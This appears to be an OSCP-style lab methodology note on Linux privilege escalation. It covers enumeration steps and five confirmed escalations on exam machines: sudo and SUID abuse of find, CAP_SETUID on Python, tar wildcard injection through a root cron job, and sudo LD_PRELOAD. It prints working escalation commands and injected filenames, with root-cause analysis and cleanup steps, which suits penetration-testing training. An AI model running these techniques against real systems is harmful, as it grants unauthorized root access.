---
type: methodology
project: OSCP-Exam-PoC
status: drafted
updated: "2026-11-07"
tags:
  - methodology
  - linux
  - privilege-escalation
  - sudo
  - suid
  - capabilities
  - cron
  - oscp
---

# Linux Privilege Escalation

## 1. Objective

Linux privilege escalation begins after obtaining a user-level foothold. The objective is to identify a weakness that allows the current execution context to perform actions with privileges it was not intended to possess.

The examination demonstrated four distinct escalation mechanisms:

|Machine|Initial identity|Confirmed mechanism|Privileged result|
|---|---|---|---|
|VE-01|`www-data`|Sudo misconfiguration involving `find`|Effective UID 0|
|EA-01|`robert`|SUID `find`|Effective UID 0|
|ME-01|`svc`|`CAP_SETUID` on a Python executable|Real and effective UID 0|
|HA-01|`devops`|Root cron job with tar wildcard injection|Root command execution|
|IN-01|`web`|Sudo `LD_PRELOAD` environment preservation|UID/EUID 0|

These paths demonstrate why privilege escalation must be driven by local evidence rather than by a fixed list of exploits.

## 2. Enumeration Workflow

### Phase 1 — Establish the execution context

Start with:

```
id
whoami
groups
hostname
pwd
uname -a
cat /etc/os-release
```

Record the following:

- Current username.
    
- Real and effective UID.
    
- Primary and supplementary groups.
    
- Hostname.
    
- Working directory.
    
- Operating system and kernel.
    
- Whether execution takes place inside a container.
    

Do not assume that the username alone describes the process's actual privileges.

### Phase 2 — Check sudo permissions

```
sudo -n -l 2>&1
```

Inspect:

- Commands permitted as root.
    
- Commands permitted as other users.
    
- `NOPASSWD` rules.
    
- Environment variables preserved by sudo.
    
- Wildcard arguments and unrestricted command parameters.
    

A missing `sudo` executable is not evidence that escalation is impossible. Continue with the other enumeration mechanisms.

### Phase 3 — Enumerate SUID and SGID binaries

SUID:

```
find / -type f -perm -4000 -ls 2>/dev/null
```

SGID:

```
find / -type f -perm -2000 -ls 2>/dev/null
```

For a more useful inventory:

```
find / -xdev -type f \( -perm -4000 -o -perm -2000 \) \
  -printf '%m %u:%g %p\n' 2>/dev/null | sort
```

Prioritize:

- Custom executables.
    
- Unusual binaries in `/usr/local/bin`, `/opt`, or application directories.
    
- Root-owned executables with dangerous functionality.
    
- Binaries whose SUID or SGID permissions are unexpected.
    
- Known GTFOBins candidates.
    

Do not treat every SUID binary as exploitable. Confirm the binary's ownership, permissions, functionality, and actual behavior.

### Phase 4 — Enumerate Linux capabilities

```
getcap -r / 2>/dev/null
```

Pay particular attention to capabilities that permit privileged operations, including:

|Capability|Security significance|
|---|---|
|`cap_setuid`|Change process user IDs|
|`cap_setgid`|Change process group IDs|
|`cap_sys_admin`|Broad system administration operations|
|`cap_dac_override`|Bypass discretionary file permission checks|
|`cap_net_raw`|Create raw network sockets|

For each finding, establish:

1. Which executable has the capability?
    
2. Who owns the executable?
    
3. What type of executable is it?
    
4. Can its functionality invoke the operation granted by the capability?
    
5. Can the resulting privileges be demonstrated?
    

A capability listing identifies a lead, not an automatic root shell.

### Phase 5 — Inspect scheduled tasks

```
cat /etc/crontab 2>/dev/null
```

```
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

Inspect file and directory permissions:

```
ls -ld /etc/cron* /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
```

Find writable scheduled-task files:

```
find /etc/cron* /var/spool/cron -type f -writable -ls 2>/dev/null
```

For every interesting cron entry, trace the complete execution chain:

<figure class="method-atlas-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/methodology-atlas-cron-dependencies-mobile.svg" />
    <img src="/diagrams/methodology-atlas-cron-dependencies.svg" alt="Linux privilege escalation / cron dependency map: Cron configuration then Scheduled command then Script or executable then Files, directories, dependencies and arguments." width="960" height="530" loading="lazy" decoding="async" />
  </picture>
  <figcaption>Inspect the complete scheduled-execution dependency chain. All original steps and labels are retained; refer to the surrounding methodology for evidence and limitations.</figcaption>
</figure>

Inspect the ownership and permissions of every relevant component. A root-owned cron configuration is not automatically exploitable; the executed script or one of its dependencies must expose a usable weakness.

### Phase 6 — Inspect processes, services and writable paths

```
ps auxww
```

```
ss -lntup
```

Check common service and configuration locations:

```
find /opt /usr/local /etc -type f -writable -ls 2>/dev/null
```

Inspect:

- Root-owned services.
    
- Systemd units and timers.
    
- Writable scripts executed by privileged processes.
    
- Writable parent directories.
    
- Service configuration files.
    
- Application credentials and secrets.
    
- Unsafe relative paths and environment variables.
    

### Phase 7 — Check container boundaries

Useful indicators include:

```
systemd-detect-virt
cat /proc/1/cgroup
ls -la /.dockerenv
```

The presence of `/.dockerenv` is an indication of Docker-related execution context, but it does not by itself prove a container escape vulnerability.

Investigate mounted filesystems, exposed sockets, capabilities, and container privileges only when the environment provides evidence that they matter.

## 3. Confirmed Examination Techniques

### 3.1 VE-01 — Sudo Misconfiguration with `find`

**Initial identity:** `www-data`

The sudo configuration permitted the web application account to execute `/usr/bin/find` as root without a password.

Confirmed sudo rule:

```
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

The weakness was unrestricted access to a binary that supports executing external commands through `-exec`.

**Exploitation:**

```
sudo /usr/bin/find . -exec /bin/sh -p -c 'id; cat /root/root.txt' \; -quit
```

The command:

- Invokes the permitted binary through sudo.
    
- Uses `find -exec` to execute a shell.
    
- Uses `/bin/sh -p` to preserve elevated privileges.
    
- Executes the identity check and root-flag read.
    

The resulting identity included:

```
uid=33(www-data) gid=33(www-data) euid=0(root)
```

The important indicator is `euid=0(root)`. The real UID remains `www-data`, while the effective UID is root.

**Root cause:** The sudo rule allowed unrestricted use of a binary capable of executing arbitrary commands.

**Technique:** Sudo misconfiguration → GTFOBins-style binary abuse.

### 3.2 EA-01 — SUID `find`

**Initial identity:** `robert`

The SUID inventory revealed:

```
-rwsr-xr-x 1 root root ... /usr/bin/find
```

The `s` in the owner's execute position indicates that the SUID bit is enabled.

Because the binary is owned by root, execution can retain an effective UID of 0.

**Exploitation:**

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**Verification:**

```
id
whoami
```

Confirmed identity:

```
uid=1000(robert) gid=1000(robert) euid=0(root)
```

`whoami` may still report `robert` because the real UID remains unchanged. The effective UID is the relevant indicator for privileged operations.

**Root cause:** A general-purpose binary with command-execution functionality was unnecessarily assigned SUID root permissions.

**Technique:** SUID misconfiguration → privileged command execution.

**Important distinction:** EA-01 did not use the same mechanism as VE-01. VE-01 exploited a sudoers rule; EA-01 exploited the SUID bit on the binary itself.

### 3.3 ME-01 — `CAP_SETUID` on a Python Executable

**Initial identity:** `svc`

The capabilities enumeration returned:

```
/usr/local/bin/pyadmin cap_setuid=ep
```

The executable was inspected and identified as:

```
/usr/local/bin/pyadmin
Python 3.11.18
```

Its ordinary file permissions were:

```
-rwxr-xr-x 1 root root 14472 ... /usr/local/bin/pyadmin
```

It was not SUID. Its privilege came from the assigned capability.

`CAP_SETUID` permits a process to change its user IDs. Python exposes the relevant operation through `os.setuid()`.

**Capability verification:**

```
/usr/local/bin/pyadmin -c \
  "import os; print(os.getuid(), os.geteuid()); os.setuid(0); print(os.getuid(), os.geteuid())"
```

Confirmed output:

```
1000 1000
0 0
```

This demonstrated that the interpreter could change both its real and effective UID to root.

**Root-flag retrieval:**

```
/usr/local/bin/pyadmin -c \
  'import os; os.setuid(0); print(open("/root/root.txt").read())'
```

In the examination, this operation was executed through the already established command-injection interface.

An important distinction: the Gunicorn application process remained `svc`. The child process running `pyadmin` obtained root privileges.

**Root cause:** A Python interpreter had been granted `CAP_SETUID`, allowing its execution context to change its UID to 0.

**Technique:** Linux capability abuse → privileged interpreter execution.

### 3.4 HA-01 — Root Cron Job and GNU tar Wildcard Injection

**Initial identity:** `devops`

The sudo utility was not installed. SUID and capability enumeration did not reveal a useful escalation path.

Cron enumeration identified a custom scheduled task:

```
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

The script contained:

```
#!/bin/sh
cd /opt/maint/spool 2>/dev/null || exit 0
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The spool directory was owned by `devops`:

```
drwxr-xr-x 1 devops devops ... /opt/maint/spool
```

The directory was writable by the current user.

This created the required conditions:

|Requirement|Evidence|
|---|---|
|Privileged scheduled execution|Root cron job runs every minute|
|Vulnerable argument handling|Unquoted wildcard passed to `tar`|
|Attacker-controlled filenames|`devops` owns the spool directory|
|Execution opportunity|GNU tar interprets injected filenames as options|

#### Exploitation

A script was created in the writable spool directory to copy the root flag into a location readable by `devops`:

```
#!/bin/sh
cat /root/root.txt > /opt/maint/spool/root.txt
chmod 644 /opt/maint/spool/root.txt
```

The script was made executable:

```
chmod 700 root-flag.sh
```

Two specially named files were created:

```
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh root-flag.sh'
```

When root cron executed the backup script, the shell expanded `*` into the filenames. GNU tar interpreted the injected filenames as options and executed the checkpoint action with the cron job's privileges.

The generated file was then read:

```
cat /opt/maint/spool/root.txt
```

After successful retrieval, the injected files and helper script were removed:

```
rm -f -- \
  '--checkpoint=1' \
  '--checkpoint-action=exec=sh root-flag.sh' \
  root-flag.sh
```

**Root cause:** A privileged backup script passed attacker-controlled filenames to GNU tar through an unquoted wildcard.

**Technique:** Writable directory → wildcard option injection → root cron execution.

### 3.5 IN-01 — Sudo `LD_PRELOAD` Shared-Library Injection

**Initial identity:** `web`

The sudo configuration exposed:

```
User web may run the following commands on insane:

(root) NOPASSWD: /usr/local/bin/healthcheck
```

Sudo Defaults also included:

```
env_keep+=LD_PRELOAD
```

The allowed binary was:

```
/usr/local/bin/healthcheck
```

Its relevant properties were:

|Attribute|Value|
|---|---|
|Owner|root|
|Group|root|
|Permissions|0755|
|Type|Dynamically linked ELF|
|Size|15,960 bytes|

The target also provided GCC, allowing a shared library to be compiled locally on the compromised machine.

#### Shared-library compilation

The C source was saved as:

```
/tmp/in01_preload.c
```

It was compiled with:

```
gcc -Wall -Wextra -fPIC -shared \
  -o /tmp/in01_preload.so \
  /tmp/in01_preload.c
```

#### Privileged execution

The library was loaded through the permitted sudo command:

```
sudo -n LD_PRELOAD=/tmp/in01_preload.so \
  /usr/local/bin/healthcheck
```

The constructor executed and returned:

```
[+] LD_PRELOAD constructor executed
[+] UID=0 EUID=0 GID=0 EGID=0
```

The library successfully accessed `/root/root.txt`.

**Root cause:** The sudoers configuration allowed a user to execute a root-owned dynamically linked program while preserving `LD_PRELOAD`. This enabled a user-controlled shared library to execute in the privileged process.

**Technique:** Sudo environment preservation → dynamic linker shared-library injection.

## 4. Cross-Machine Comparison

|Mechanism|VE-01|EA-01|ME-01|HA-01|IN-01|
|---|---|---|---|---|---|
|Sudo misconfiguration|Yes|No|No|No|Yes|
|SUID abuse|No|Yes|No|No|No|
|Linux capabilities|No|No|Yes|No|No|
|Cron abuse|No|No|No|Yes|No|
|Wildcard injection|No|No|No|Yes|No|
|`LD_PRELOAD`|No|No|No|No|Yes|
|Root identity confirmed|Yes|Yes|Yes|Yes|Yes|

The machines demonstrate that the absence of one escalation mechanism does not imply the absence of another.

For example:

- No `sudo` on EA-01 did not prevent SUID exploitation.
    
- No useful SUID binary on ME-01 did not prevent capability abuse.
    
- No `sudo` on HA-01 did not prevent exploitation of a root cron job.
    
- IN-01 required inspection of sudo environment handling, not merely the permitted executable.
    

## 5. Prioritization Strategy

Use the following order as an investigation framework, not as a rigid exploit sequence.

|Priority|Area|Reason|
|---|---|---|
|1|Sudo permissions|Explicitly delegated privileged execution is high-value|
|2|SUID/SGID binaries|Can expose privileged functionality through executable behavior|
|3|Linux capabilities|May grant specific privileged operations to ordinary executables|
|4|Cron and scheduled tasks|Root-executed scripts may depend on attacker-controlled files|
|5|Services and systemd|Misconfigured privileged services can expose execution paths|
|6|Writable paths and dependencies|May enable replacement, injection, or path manipulation|
|7|Container configuration|Relevant when container boundaries or excessive privileges are present|
|8|Kernel vulnerabilities|Investigate only when the kernel and environment support a credible candidate|

The order should change when evidence reveals a stronger path. HA-01, for example, became a cron investigation after the SUID and capability checks produced no useful lead.

## 6. Verification Requirements

A successful exploit must be followed by explicit privilege verification.

For shell-based access:

```
id
whoami
```

For a process that changes its identity internally, inspect both real and effective IDs.

|Evidence|Interpretation|
|---|---|
|`uid=1000(user) euid=0(root)`|Effective root privileges|
|`uid=0(root) euid=0(root)`|Real and effective root identity|
|`whoami` reports the original user|Does not disprove effective root privileges|
|Root flag readable|Confirms access to the protected objective, but preserve the identity evidence too|

Do not claim a root shell if only a child process or a single privileged command obtained root privileges. Describe the actual execution context.

## 7. Cleanup and State Preservation

After exploitation:

- Remove temporary payload files and injected filenames.
    
- Remove temporary shared libraries and source files when no longer needed.
    
- Restore modified service configuration where applicable.
    
- Preserve relevant command output and proof of execution.
    
- Avoid removing evidence required for the examination report before it has been recorded.
    
- Do not modify unrelated target files.
    

For scheduled-task and persistence exploits, cleanup is particularly important because the privileged process may continue executing on its normal schedule.

## 8. Completion Criteria

- Initial user identity and groups recorded.
    
- Sudo permissions checked.
    
- SUID and SGID binaries enumerated.
    
- Linux capabilities enumerated.
    
- Cron jobs and scheduled tasks inspected.
    
- Relevant services and writable paths investigated.
    
- The selected escalation mechanism supported by evidence.
    
- Exploitation performed through the confirmed weakness.
    
- Root identity or privileged execution verified.
    
- `/root/root.txt` retrieved and submitted.
    
- Temporary payloads and modifications cleaned up.
    

## 9. Related Notes

- [[Initial Access]]
    
- [[Evidence Collection]]
    
- [[VE-01 Overview]]
    
- [[EA-01 Overview]]
    
- [[ME-01 Overview]]
    
- [[HA-01 Overview]]
    
- [[IN-01 Overview]]
    
- [[Linux Privilege Escalation]]